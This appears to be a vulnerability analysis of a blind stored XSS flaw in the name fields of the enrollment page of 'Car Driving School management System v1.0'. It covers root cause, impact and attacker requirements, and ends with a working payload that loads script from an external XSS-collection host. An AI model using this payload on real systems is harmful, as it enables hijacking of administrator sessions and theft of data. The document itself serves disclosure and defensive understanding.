Based on the provided content, here's an analysis of the vulnerability:

**Root Cause of Vulnerability:**
The root cause is the lack of proper input sanitization and output encoding in the "Car Driving School management System v1.0". User-supplied data, specifically in the "First Name" or "Last Name" fields on the enrollment page, is not sanitized before being stored in the system. This allows an attacker to inject malicious script into the database. When an admin views the details containing the malicious script, it executes in their browser.

**Weaknesses/Vulnerabilities Present:**
- **Blind Cross-Site Scripting (XSS):** The primary vulnerability is a blind XSS. The injected script is not immediately visible to the attacker after injection. Instead, it is triggered when an administrator views the infected data, making it "blind".

**Impact of Exploitation:**
- **Remote Code Execution:** An attacker can execute arbitrary JavaScript code within the administrator's browser. This can lead to:
    - **Admin Account Takeover:** The attacker could potentially steal session cookies, allowing them to impersonate the admin and gain full control of the application.
    - **Data Theft:** The attacker could access and exfiltrate sensitive information viewed by the admin.
    - **Internal Network Reconnaissance:** The attacker can potentially gain insights about the internal network by accessing resources within the admin's network.
    - **Malware Delivery:** The attacker can redirect the admin to other malicious sites, delivering malware.

**Attack Vectors:**
- **Web Interface:** The attacker exploits the vulnerable input fields within the web application's user interface.

**Required Attacker Capabilities/Position:**
- **Access to the Enrollment Page:** The attacker must be able to access the enrollment page of the "Car Driving School management System v1.0".
- **Ability to Inject Script:** The attacker needs to be able to input the malicious payload (JavaScript code) into the vulnerable form fields ("First Name" or "Last Name").
- **Patience/Persistence:** The attacker must wait for an administrator to view the injected data for the XSS to be triggered.

**Payload used for the exploit:**
```html
"><script src=https://d4.xss.ht></script>
```
